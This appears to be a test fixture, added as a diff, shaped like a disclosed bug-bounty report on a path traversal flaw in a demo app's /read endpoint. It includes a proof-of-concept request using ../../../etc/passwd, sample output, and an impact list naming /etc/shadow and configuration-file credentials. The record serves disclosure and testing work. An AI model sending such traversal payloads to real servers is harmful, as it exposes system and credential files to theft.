@@ -1,0 +1,14 @@
+{
+  "id": 900005,
+  "title": "Path Traversal in File Read Endpoint Allows Reading Arbitrary System Files",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "visibility": "full",
+  "team": {"handle": "resurface-testapp", "name": "Resurface Test App"},
+  "reporter": {"username": "demo_hacker"},
+  "weakness": {"id": 19, "name": "Path Traversal"},
+  "vulnerability_information": "## Summary\nThe `/read` endpoint accepts a `file` parameter that is used to read files from the server. The parameter is not sanitized, allowing directory traversal sequences (`../`) to access files outside the intended directory.\n\n## Steps to Reproduce\n1. Navigate to the target application\n2. Access the file read endpoint with a normal file:\n   ```\n   GET /read?file=readme.txt\n   ```\n3. Use directory traversal to read system files:\n   ```\n   GET /read?file=../../../etc/passwd\n   ```\n4. The response contains the contents of `/etc/passwd`\n\n## Proof of Concept\n```http\nGET /read?file=../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\nResponse:\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\n```\n\n## Impact\n- Read any file on the server that the web process has access to\n- Exposure of `/etc/passwd`, `/etc/shadow` (if readable), application source code\n- Potential credential theft from configuration files\n- Information gathering for further exploitation",
+  "disclosed_at": "2025-07-10T16:00:00.000Z",
+  "bounty_amount": "1500.0"
+}
